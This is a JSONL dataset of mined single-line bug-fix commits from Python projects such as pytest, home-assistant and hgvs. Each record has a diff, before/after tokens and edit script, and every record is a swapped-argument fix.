{"project": "A3C_tensorflow", "commit_sha": "8ee07309d19b5975962d8f86941a1be35d2dbe7f", "parent_sha": "349664d2900461f04436e94d540ee29d9ffd4c0d", "file_path": "Net_A3C.py", "project_url": "https://github.com/gliese581gg/A3C_tensorflow", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,7 +73,7 @@ def build_local(params,net_name,device=\"/gpu:0\"):\n \t\t\t\tcells = rnn_cell.BasicLSTMCell(params['dim_fc'], forget_bias=1.0,state_is_tuple=True)\n \t\t\t\tLSTM_h_ph = tf.placeholder('float',[1,params['dim_fc']])  #batch,dim\t\n \t\t\t\tLSTM_c_ph = tf.placeholder('float',[1,params['dim_fc']]) \t\n-\t\t\t\tstate_tuple = tf.nn.rnn_cell.LSTMStateTuple(LSTM_h_ph,LSTM_c_ph)\t\n+\t\t\t\tstate_tuple = tf.nn.rnn_cell.LSTMStateTuple(LSTM_c_ph,LSTM_h_ph)\t\n \t\t\t\tfc2 = tf.reshape(fc2,[1,-1,fc2.get_shape().as_list()[-1]])\n \t\t\t\tunroll = tf.placeholder(tf.int32,[1])\n \t\t\t\tfc2, fc2_state = tf.nn.dynamic_rnn(cells,fc2,initial_state = state_tuple,sequence_length = unroll)\n", "before": "state_tuple = tf . nn . rnn_cell . LSTMStateTuple ( LSTM_h_ph , LSTM_c_ph )", "after": "state_tuple = tf . nn . rnn_cell . LSTMStateTuple ( LSTM_c_ph , LSTM_h_ph )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:LSTM_h_ph\", 3, 49, 3, 58], [\"argument_list\", 3, 48, 3, 69], 3], [\"Move\", [\",:,\", 3, 58, 3, 59], [\"argument_list\", 3, 48, 3, 69], 4]]"}
{"project": "VisTrails", "commit_sha": "aa54298d089c131c2b2fc7199d327d4af2ff77fc", "parent_sha": "aec0ed019ac57548d28503c4dbc2951ad054367b", "file_path": "vistrails/packages/controlflow/fold.py", "project_url": "https://github.com/Nikea/VisTrails", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -202,7 +202,7 @@ class Fold(Module, NotCacheable):\n \n         v_module = self.createSignature(v_module)\n         port_spec2 = PortSpec(**{'signature': v_module})\n-        matched = reg.are_specs_matched(port_spec1, port_spec2)\n+        matched = reg.are_specs_matched(port_spec2, port_spec1)\n                 \n         return matched\n         \n", "before": "matched = reg . are_specs_matched ( port_spec1 , port_spec2 )", "after": "matched = reg . are_specs_matched ( port_spec2 , port_spec1 )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:port_spec1\", 3, 41, 3, 51], [\"argument_list\", 3, 40, 3, 64], 3], [\"Move\", [\",:,\", 3, 51, 3, 52], [\"argument_list\", 3, 40, 3, 64], 4]]"}
{"project": "CGTeamWork", "commit_sha": "5585b4511c7d263a188ed61d58cc7fb165574d15", "parent_sha": "978d8fb7109a8ed2e6bd9540b656bdb43febfe78", "file_path": "lib/run_uploader.py", "project_url": "https://github.com/WuLiFang/CGTeamWork", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -16,7 +16,7 @@ def setup_prefix_filter():\n     cgtwq.helper.wlf.CGTWQHelper.prefix_filters.append(\n         lambda x: x.replace('QNPV', 'QNYH'))\n     cgtwq.helper.wlf.CGTWQHelper.prefix_filters.append(\n-        lambda x: x.replace('YLDE', 'YLDL'))\n+        lambda x: x.replace('YLDL', 'YLDE'))\n \n \n if __name__ == '__main__':\n", "before": "cgtwq . helper . wlf . CGTWQHelper . prefix_filters . append ( lambda x : x . replace ( 'YLDE' , 'YLDL' ) )", "after": "cgtwq . helper . wlf . CGTWQHelper . prefix_filters . append ( lambda x : x . replace ( 'YLDL' , 'YLDE' ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"string:'YLDE'\", 3, 29, 3, 35], [\"argument_list\", 3, 28, 3, 44], 3], [\"Move\", [\",:,\", 3, 35, 3, 36], [\"argument_list\", 3, 28, 3, 44], 4]]"}
{"project": "tacotron", "commit_sha": "550b7d02fb1d0dade030db06b88cb10e7a805ac4", "parent_sha": "3d03e81c4aeeaeb7045552eee63d8e7cf577516c", "file_path": "modules.py", "project_url": "https://github.com/zuoxiang95/tacotron", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -177,7 +177,7 @@ def conv1d_banks(inputs, K=16, is_training=True, scope=\"conv1d_banks\", reuse=Non\n                             activation_fn=tf.nn.relu)\n         for k in range(2, K+1): # k = 2...K\n             with tf.variable_scope(\"num_{}\".format(k)):\n-                output = conv1d(inputs, k, hp.embed_size//2, 1)\n+                output = conv1d(inputs, hp.embed_size // 2, k, 1)\n                 output = normalize(output, type=\"bn\", is_training=is_training, \n                             activation_fn=tf.nn.relu)\n                 outputs = tf.concat((outputs, output), -1)\n", "before": "output = conv1d ( inputs , k , hp . embed_size // 2 , 1 )", "after": "output = conv1d ( inputs , hp . embed_size // 2 , k , 1 )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 32, 3, 64], [\"identifier:k\", \"T\"], 6], [\"Insert\", [\"argument_list\", 3, 32, 3, 64], [\",:,\", \"T\"], 7], [\"Delete\", [\"identifier:k\", 3, 41, 3, 42]], [\"Delete\", [\",:,\", 3, 42, 3, 43]]]"}
{"project": "python-json-tools", "commit_sha": "9268c5bf41d62865d51b390eb5d31ce04610f91b", "parent_sha": "918861377f5091ce534f4a2309e84a39b70108a6", "file_path": "sb_json_tools/jt_iter/json_iter.py", "project_url": "https://github.com/spraakbanken/python-json-tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -104,7 +104,7 @@ def load_from_file(filename: str):\n \n def dump_to_file(filename, gen):\n     with open(filename, 'w') as fp:\n-        return dump(fp, gen)\n+        return dump(gen, fp)\n \n \n def main():\n", "before": "return dump ( fp , gen )", "after": "return dump ( gen , fp )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:fp\", 3, 21, 3, 23], [\"argument_list\", 3, 20, 3, 29], 3], [\"Move\", [\",:,\", 3, 23, 3, 24], [\"argument_list\", 3, 20, 3, 29], 4]]"}
{"project": "clean", "commit_sha": "5dca54258424c0039477766b14384c96e4269e3e", "parent_sha": "3ca3fc12409bd932738cfb0b7106bd81845b3c2f", "file_path": "clean/add.py", "project_url": "https://github.com/HibikineKage/clean", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -7,4 +7,4 @@ from .config import Config\n \n def add_new_config(regexp: str, path: str):\n     config = Config()\n-    return config.add_regexp_path(path, regexp)\n+    return config.add_regexp_path(regexp, path)\n", "before": "return config . add_regexp_path ( path , regexp )", "after": "return config . add_regexp_path ( regexp , path )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:path\", 3, 35, 3, 39], [\"argument_list\", 3, 34, 3, 48], 3], [\"Move\", [\",:,\", 3, 39, 3, 40], [\"argument_list\", 3, 34, 3, 48], 4]]"}
{"project": "ranger", "commit_sha": "a8f6fc969190ca06676ad749b48bfc45053f84d2", "parent_sha": "3fe387545dcd8e5961645a893710eaf58ded003f", "file_path": "ranger/defaults/apps.py", "project_url": "https://github.com/chuanconggao/ranger", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -17,7 +17,7 @@ class CustomApplications(Applications):\n \n \t\tif f.extension is not None:\n \t\t\tif f.extension in ('pdf'):\n-\t\t\t\treturn self.either(c, 'apvlv', 'evince')\n+\t\t\t\treturn self.either(c, 'evince', 'apvlv')\n \t\t\tif f.extension in ('html', 'htm', 'xhtml', 'swf'):\n \t\t\t\treturn self.either(c, 'firefox', 'opera', 'elinks')\n \t\t\tif f.extension in ('swc', 'smc'):\n", "before": "return self . either ( c , 'apvlv' , 'evince' )", "after": "return self . either ( c , 'evince' , 'apvlv' )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"string:'apvlv'\", 3, 27, 3, 34], [\"argument_list\", 3, 23, 3, 45], 5], [\"Move\", [\",:,\", 3, 34, 3, 35], [\"argument_list\", 3, 23, 3, 45], 6]]"}
{"project": "pytest", "commit_sha": "27d932e882152c828352ec4855ac2e16d23cc115", "parent_sha": "40091ec2c733331b45ec7ee68538aab6afbcdec1", "file_path": "src/_pytest/outcomes.py", "project_url": "https://github.com/Zac-HD/pytest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -66,7 +66,7 @@ def exit(msg, returncode=None):\n     __tracebackhide__ = True\n-    raise Exit(returncode, msg)\n+    raise Exit(msg, returncode)\n \n \n exit.Exception = Exit\n", "before": "raise Exit ( returncode , msg )", "after": "raise Exit ( msg , returncode )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:returncode\", 1, 16, 1, 26], [\"argument_list\", 1, 15, 1, 32], 3], [\"Move\", [\",:,\", 1, 26, 1, 27], [\"argument_list\", 1, 15, 1, 32], 4]]"}
{"project": "pygr", "commit_sha": "94a8042e42b3e4b49211083aae22fb122979d563", "parent_sha": "30d4d618b8a27a03171c2d439a79dd8f7931840b", "file_path": "pygr/metabase.py", "project_url": "https://github.com/cjlee112/pygr", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -736,7 +736,7 @@ not be ready to do!''' % resID\n     def add_schema(self, resID, schemaObj):\n         'assign a schema relation object to a pygr.Data resource name'\n         l = resID.split('.')\n-        schemaPath = SchemaPath('.'.join(l[:-1]), self)\n+        schemaPath = SchemaPath(self, '.'.join(l[:-1]))\n         setattr(schemaPath, l[-1], schemaObj)\n     def list_pending(self):\n         return self.get_writer().saver.list_pending()\n", "before": "schemaPath = SchemaPath ( '.' . join ( l [ : - 1 ] ) , self )", "after": "schemaPath = SchemaPath ( self , '.' . join ( l [ : - 1 ] ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 32, 3, 56], [\"identifier:self\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 32, 3, 56], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 49, 3, 50]], [\"Delete\", [\"identifier:self\", 3, 51, 3, 55]]]"}
{"project": "ckanext-harvest", "commit_sha": "09ec3c006dfc302360e32d8d133f6102b3b1df60", "parent_sha": "c9a308ed83b0720aad469ebe427b21fdba392afa", "file_path": "ckanext/harvest/queue.py", "project_url": "https://github.com/ckan/ckanext-harvest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -203,7 +203,7 @@ class RedisPublisher(object):\n         value = json.dumps(body)\n         # remove if already there\n         if self.routing_key == get_gather_routing_key():\n-            self.redis.lrem(self.routing_key, 0, value)\n+            self.redis.lrem(self.routing_key, value, 0)\n         self.redis.rpush(self.routing_key, value)\n \n     def close(self):\n", "before": "self . redis . lrem ( self . routing_key , 0 , value )", "after": "self . redis . lrem ( self . routing_key , value , 0 )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 28, 3, 56], [\"identifier:value\", \"T\"], 3], [\"Insert\", [\"argument_list\", 3, 28, 3, 56], [\"integer:0\", \"T\"], 6], [\"Delete\", [\"integer:0\", 3, 47, 3, 48]], [\"Delete\", [\"identifier:value\", 3, 50, 3, 55]]]"}
{"project": "GlobaLeaks", "commit_sha": "120c0702fde179600dde5cc7467a3ae44bbdd393", "parent_sha": "238216dd0e7996aa2962f2b8ff8ca3efad00ea7c", "file_path": "scripts/stresser.py", "project_url": "https://github.com/mmaker/GlobaLeaks", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -177,7 +177,7 @@ def submissionWorkflow(context, request_delay, idx):\n     if idx == 0:\n         print \"I am now done\"\n     else:\n-        reactor.callLater(request_delay, submissionWorkflow, request_delay, context, idx)\n+        reactor.callLater(request_delay, submissionWorkflow, context, request_delay, idx)\n \n @defer.inlineCallbacks\n def submissionFuzz(request_delay, submission_count):\n", "before": "reactor . callLater ( request_delay , submissionWorkflow , request_delay , context , idx )", "after": "reactor . callLater ( request_delay , submissionWorkflow , context , request_delay , idx )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:request_delay\", 3, 62, 3, 75], [\"argument_list\", 3, 26, 3, 90], 7], [\"Move\", [\",:,\", 3, 75, 3, 76], [\"argument_list\", 3, 26, 3, 90], 8]]"}
{"project": "erfp_data_process_ubuntu_aws", "commit_sha": "0761025b62a7d56cb8b4e50a8eb8b9d5731ca49c", "parent_sha": "d21ca52d9f5e80f44e981f99f5170fc4b8a3b64a", "file_path": "compute_ecmwf_rapid.py", "project_url": "https://github.com/CI-WATER/erfp_data_process_ubuntu_aws", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -135,7 +135,7 @@ def run_RAPID_single_watershed(forecast, watershed, rapid_executable_location, n\n \n     #convert rapid output to be CF compliant\n     convert_ecmwf_rapid_output_to_cf_compliant(watershed,\n-                                               datetime.datetime.strptime(\"%Y%m%d.%H\", forecast_date_timestep[:11]))\n+                                               datetime.datetime.strptime(forecast_date_timestep[:11], \"%Y%m%d.%H\"))\n \n     #remove rapid link\n     try:\n", "before": "convert_ecmwf_rapid_output_to_cf_compliant ( watershed , datetime . datetime . strptime ( \"%Y%m%d.%H\" , forecast_date_timestep [ : 11 ] ) )", "after": "convert_ecmwf_rapid_output_to_cf_compliant ( watershed , datetime . datetime . strptime ( forecast_date_timestep [ : 11 ] , \"%Y%m%d.%H\" ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 74, 3, 116], [\",:,\", \"T\"], 3], [\"Insert\", [\"argument_list\", 3, 74, 3, 116], [\"string:\\\"%Y%m%d.%H\\\"\", \"T\"], 4], [\"Delete\", [\"string:\\\"%Y%m%d.%H\\\"\", 3, 75, 3, 86]], [\"Delete\", [\",:,\", 3, 86, 3, 87]]]"}
{"project": "reddit-scraper", "commit_sha": "0844cb3d4781626e65d4887e612689ad35639524", "parent_sha": "11d03f2a7d7bce23454954f1f4b5017e5c1d7969", "file_path": "src/reddit_scraper/plugin_interface.py", "project_url": "https://github.com/oscillot/reddit-scraper", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -7,7 +7,7 @@ from reddit_scraper.plugins import loaded_plugins\n \n \n def ensure_ascii(text):\n-    unicodedata.normalize(unicode(text), 'NFD').encode('ascii',\n+    unicodedata.normalize('NFD', unicode(text)).encode('ascii',\n                                                        'xmlcharrefreplace')\n \n \n", "before": "unicodedata . normalize ( unicode ( text ) , 'NFD' ) . encode ( 'ascii' , 'xmlcharrefreplace' )", "after": "unicodedata . normalize ( 'NFD' , unicode ( text ) ) . encode ( 'ascii' , 'xmlcharrefreplace' )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 48], [\"string:'NFD'\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 26, 3, 48], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 40, 3, 41]], [\"Delete\", [\"string:'NFD'\", 3, 42, 3, 47]]]"}
{"project": "fit", "commit_sha": "099d724dd99293c42e8e5d81261b1ab5e8d5c060", "parent_sha": "80417a9bffa3ba61326595dc45c4bb85b6081fc2", "file_path": "analyze_fits.py", "project_url": "https://github.com/thacher-obs/fit", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -159,7 +159,7 @@ def noise_to_mag(noise_in,debug=False):\n         plt.clf()\n         plt.plot(mag,noise,'o')\n         plt.yscale('log')\n-        plt.plot([noise_in],[mag_out],'rx',markersize=20)\n+        plt.plot([mag_out],[noise_in],'rx',markersize=20)\n \n     return mag_out\n     \n", "before": "plt . plot ( [ noise_in ] , [ mag_out ] , 'rx' , markersize = 20 )", "after": "plt . plot ( [ mag_out ] , [ noise_in ] , 'rx' , markersize = 20 )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"list\", 3, 18, 3, 28], [\"argument_list\", 3, 17, 3, 58], 2], [\"Move\", [\"list\", 3, 29, 3, 38], [\"argument_list\", 3, 17, 3, 58], 1]]"}
{"project": "hgvs", "commit_sha": "8fd57c7858b2e9db102fa90277970632c1f27985", "parent_sha": "4a672c0762721a1d0a20d5bc9c4f8b895cfc64f9", "file_path": "hgvs/variantmapper.py", "project_url": "https://github.com/invitae/hgvs", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -64,7 +64,7 @@ class VariantMapper(object):\n                 edit.alt = edit.alt.replace('U', 'T').replace('u', 't')\n         elif isinstance(edit, hgvs.edit.Dup):\n             if edit.seq:\n-                edit.seq = edit.seq.replace('U', 'T').replace('t', 'u')\n+                edit.seq = edit.seq.replace('U', 'T').replace('u', 't')\n         return edit\n \n     def g_to_c(self, var_g, tx_ac, alt_aln_method='splign'):\n", "before": "edit . seq = edit . seq . replace ( 'U' , 'T' ) . replace ( 't' , 'u' )", "after": "edit . seq = edit . seq . replace ( 'U' , 'T' ) . replace ( 'u' , 't' )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"string:'t'\", 3, 63, 3, 66], [\"argument_list\", 3, 62, 3, 72], 3], [\"Move\", [\",:,\", 3, 66, 3, 67], [\"argument_list\", 3, 62, 3, 72], 4]]"}
{"project": "hgvs", "commit_sha": "80465e6886057b1442b0ca1b0749f623dd99d980", "parent_sha": "cd2ed1384b9f0dfc756e9c696620971954e4c38f", "file_path": "hgvs/variantmapper.py", "project_url": "https://github.com/invitae/hgvs", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -64,7 +64,7 @@ class VariantMapper(object):\n                 edit.alt = edit.alt.replace('U', 'T').replace('u', 't')\n         elif isinstance(edit, hgvs.edit.Dup):\n             if edit.seq:\n-                edit.seq = edit.seq.replace('T', 'U').replace('t', 'u')\n+                edit.seq = edit.seq.replace('T', 'U').replace('u', 't')\n         return edit\n \n     def g_to_c(self, var_g, tx_ac, alt_aln_method='splign'):\n", "before": "edit . seq = edit . seq . replace ( 'T' , 'U' ) . replace ( 't' , 'u' )", "after": "edit . seq = edit . seq . replace ( 'T' , 'U' ) . replace ( 'u' , 't' )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"string:'t'\", 3, 63, 3, 66], [\"argument_list\", 3, 62, 3, 72], 3], [\"Move\", [\",:,\", 3, 66, 3, 67], [\"argument_list\", 3, 62, 3, 72], 4]]"}
{"project": "hgvs", "commit_sha": "9492d569a071b7d96342c99b81cbfa2c658145f5", "parent_sha": "b2ea81dd2547855ee6b5b5cfa2b0fc6bc9aa9d9c", "file_path": "hgvs/variantmapper.py", "project_url": "https://github.com/invitae/hgvs", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -64,7 +64,7 @@ class VariantMapper(object):\n                 edit.alt = edit.alt.replace('U', 'T').replace('u', 't')\n         elif isinstance(edit, hgvs.edit.Dup):\n             if edit.seq:\n-                edit.seq = edit.seq.replace('T', 'U').replace('t', 'u')\n+                edit.seq = edit.seq.replace('T', 'U').replace('u', 't')\n         return edit\n \n     def g_to_c(self, var_g, tx_ac, alt_aln_method='splign'):\n", "before": "edit . seq = edit . seq . replace ( 'T' , 'U' ) . replace ( 't' , 'u' )", "after": "edit . seq = edit . seq . replace ( 'T' , 'U' ) . replace ( 'u' , 't' )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"string:'t'\", 3, 63, 3, 66], [\"argument_list\", 3, 62, 3, 72], 3], [\"Move\", [\",:,\", 3, 66, 3, 67], [\"argument_list\", 3, 62, 3, 72], 4]]"}
{"project": "hgvs", "commit_sha": "e644e874baff88c0515d09e7139b1c30d9fcc7f1", "parent_sha": "3e77c7465fb6bf110d16532515b036921cbc1b91", "file_path": "hgvs/variantmapper.py", "project_url": "https://github.com/invitae/hgvs", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -64,7 +64,7 @@ class VariantMapper(object):\n                 edit.alt = edit.alt.replace('U', 'T').replace('u', 't')\n         elif isinstance(edit, hgvs.edit.Dup):\n             if edit.seq:\n-                edit.seq = edit.seq.replace('T', 'U').replace('u', 't')\n+                edit.seq = edit.seq.replace('U', 'T').replace('u', 't')\n         return edit\n \n     def g_to_c(self, var_g, tx_ac, alt_aln_method='splign'):\n", "before": "edit . seq = edit . seq . replace ( 'T' , 'U' ) . replace ( 'u' , 't' )", "after": "edit . seq = edit . seq . replace ( 'U' , 'T' ) . replace ( 'u' , 't' )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"string:'T'\", 3, 45, 3, 48], [\"argument_list\", 3, 44, 3, 54], 3], [\"Move\", [\",:,\", 3, 48, 3, 49], [\"argument_list\", 3, 44, 3, 54], 4]]"}
{"project": "Galtron", "commit_sha": "9e8df7d74c33d53cafc39599e66c1890d98ed41a", "parent_sha": "feefe83cca1f8e6f64e8a04e64474c2f4dcab97a", "file_path": "gameFunctions.py", "project_url": "https://github.com/Ochodus/Galtron", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -302,7 +302,7 @@ def updateBullets(setting, screen, stats, sb, ship, aliens, bullets, eBullets, c\n def checkBulletAlienCol(setting, screen, stats, sb, ship, aliens, bullets, eBullets, charged_bullets):\n     \"\"\"Detect collisions between alien and bullets\"\"\"\n     collisions = pg.sprite.groupcollide(aliens, bullets, False, False)\n-    collisions.update(pg.sprite.groupcollide(charged_bullets, aliens, False, True))\n+    collisions.update(pg.sprite.groupcollide(aliens, charged_bullets, False, True))\n     if collisions:\n         sounds.enemy_explosion_sound.play()\n         for alien in collisions :\n", "before": "collisions . update ( pg . sprite . groupcollide ( charged_bullets , aliens , False , True ) )", "after": "collisions . update ( pg . sprite . groupcollide ( aliens , charged_bullets , False , True ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:charged_bullets\", 3, 46, 3, 61], [\"argument_list\", 3, 45, 3, 83], 3], [\"Move\", [\",:,\", 3, 61, 3, 62], [\"argument_list\", 3, 45, 3, 83], 4]]"}
{"project": "modelcraft", "commit_sha": "688d05f50a4c1ded44fdd3d0309fbeaadf762807", "parent_sha": "40d0bc1cd81c37f656d2eb7186694a88030bcffc", "file_path": "modelcraft/pipeline.py", "project_url": "https://github.com/paulsbond/modelcraft", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -88,7 +88,7 @@ class Pipeline():\n     def refmac(self, cycles):\n         directory = self.job_directory(\"refmac\")\n         use_phases = self.args.unbiased and self.min_rwork > 0.35\n-        job = Refmac(self.args, directory, self.current_xyz, use_phases, cycles)\n+        job = Refmac(self.args, directory, self.current_xyz, cycles, use_phases)\n         self.jobs[self.cycle].append(job)\n         self.current_hkl = job.hklout\n         self.current_xyz = job.xyzout\n", "before": "job = Refmac ( self . args , directory , self . current_xyz , use_phases , cycles )", "after": "job = Refmac ( self . args , directory , self . current_xyz , cycles , use_phases )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Update\", [\"identifier:use_phases\", 3, 62, 3, 72], \"cycles\"], [\"Update\", [\"identifier:cycles\", 3, 74, 3, 80], \"use_phases\"]]"}
{"project": "search-airline", "commit_sha": "9e3d24ab89b9c55709a4cd6db6301ce6ac4db3fe", "parent_sha": "ce740d1a981607441e59a806b7e2971a4c166600", "file_path": "pws/google.py", "project_url": "https://github.com/Victerose/search-airline", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -155,7 +155,7 @@ class Google:\n     def search_news(query, num=10, start=0,sleep=True, recent=None, country_code=None, proxies=None):\n         if sleep:\n             wait(1)\n-        url = generate_news_url(query, str(num), str(start), country_code, recent)\n+        url = generate_news_url(query, str(num), str(start), recent, country_code)\n         soup = BeautifulSoup(requests.get(url,proxies).text, \"html.parser\")\n         results = Google.scrape_news_result(soup)\n \n", "before": "url = generate_news_url ( query , str ( num ) , str ( start ) , country_code , recent )", "after": "url = generate_news_url ( query , str ( num ) , str ( start ) , recent , country_code )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Update\", [\"identifier:country_code\", 3, 62, 3, 74], \"recent\"], [\"Update\", [\"identifier:recent\", 3, 76, 3, 82], \"country_code\"]]"}
{"project": "AIChanllegerSeq2Seq", "commit_sha": "ce662f38185e54cec195f8e80d4a7139ef1b39a1", "parent_sha": "c81142c382dacc6a7550a7ded1444c73214cc280", "file_path": "seq2seq/utils.py", "project_url": "https://github.com/mingzailao/AIChanllegerSeq2Seq", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -69,5 +69,5 @@ def write_ob(filename,ob):\n         f.write(ob)\n def tokenizedAndSave(filename,savepath):\n     data=tokenized(filename)\n-    write_ob(data,savepath)\n+    write_ob(savepath,data)\n     \n", "before": "write_ob ( data , savepath )", "after": "write_ob ( savepath , data )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:data\", 3, 14, 3, 18], [\"argument_list\", 3, 13, 3, 28], 3], [\"Move\", [\",:,\", 3, 18, 3, 19], [\"argument_list\", 3, 13, 3, 28], 4]]"}
{"project": "home-assistant", "commit_sha": "2bc7444427623686209e376a97efc2043b96c3fb", "parent_sha": "4518e6bdf7d06ac9a15a1131c82fccae4029937f", "file_path": "homeassistant/components/alarm_control_panel/homematicip_cloud.py", "project_url": "https://github.com/FrengerH/home-assistant", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -76,7 +76,7 @@ class HomematicipSecurityZone(HomematicipGenericDevice, AlarmControlPanel):\n \n     async def async_alarm_arm_home(self, code=None):\n         \"\"\"Send arm home command.\"\"\"\n-        await self._home.set_security_zones_activation(True, False)\n+        await self._home.set_security_zones_activation(False, True)\n \n     async def async_alarm_arm_away(self, code=None):\n         \"\"\"Send arm away command.\"\"\"\n", "before": "await self . _home . set_security_zones_activation ( True , False )", "after": "await self . _home . set_security_zones_activation ( False , True )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"true:True\", 3, 56, 3, 60], [\"argument_list\", 3, 55, 3, 68], 3], [\"Move\", [\",:,\", 3, 60, 3, 61], [\"argument_list\", 3, 55, 3, 68], 4]]"}
{"project": "home-assistant", "commit_sha": "2d70df97760e1a58f9314783abfc4ef9cf7d4787", "parent_sha": "94fd6cceefd02ea69113ac3f59b2c0762bbafa1f", "file_path": "homeassistant/components/seventeentrack/sensor.py", "project_url": "https://github.com/elupus/home-assistant", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -259,7 +259,7 @@ class SeventeenTrackPackageSensor(Entity):\n             self._friendly_name if self._friendly_name else self._tracking_number\n         )\n         message = NOTIFICATION_DELIVERED_MESSAGE.format(\n-            self._tracking_number, identification\n+            identification, self._tracking_number\n         )\n         title = NOTIFICATION_DELIVERED_TITLE.format(identification)\n         notification_id = NOTIFICATION_DELIVERED_TITLE.format(self._tracking_number)\n", "before": "message = NOTIFICATION_DELIVERED_MESSAGE . format ( self . _tracking_number , identification )", "after": "message = NOTIFICATION_DELIVERED_MESSAGE . format ( identification , self . _tracking_number )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 2, 56, 4, 10], [\"identifier:identification\", \"T\"], 1], [\"Insert\", [\"argument_list\", 2, 56, 4, 10], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 34, 3, 35]], [\"Delete\", [\"identifier:identification\", 3, 36, 3, 50]]]"}
{"project": "home-assistant", "commit_sha": "95ffe122645194f313dda7d2c7f81c0cbe378ba6", "parent_sha": "eac5619001b65394253689cd0780a38ca2857551", "file_path": "homeassistant/components/seventeentrack/sensor.py", "project_url": "https://github.com/elupus/home-assistant", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -259,7 +259,7 @@ class SeventeenTrackPackageSensor(Entity):\n             self._friendly_name if self._friendly_name else self._tracking_number\n         )\n         message = NOTIFICATION_DELIVERED_MESSAGE.format(\n-            self._tracking_number, identification\n+            identification, self._tracking_number\n         )\n         title = NOTIFICATION_DELIVERED_TITLE.format(identification)\n         notification_id = NOTIFICATION_DELIVERED_TITLE.format(self._tracking_number)\n", "before": "message = NOTIFICATION_DELIVERED_MESSAGE . format ( self . _tracking_number , identification )", "after": "message = NOTIFICATION_DELIVERED_MESSAGE . format ( identification , self . _tracking_number )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 2, 56, 4, 10], [\"identifier:identification\", \"T\"], 1], [\"Insert\", [\"argument_list\", 2, 56, 4, 10], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 34, 3, 35]], [\"Delete\", [\"identifier:identification\", 3, 36, 3, 50]]]"}
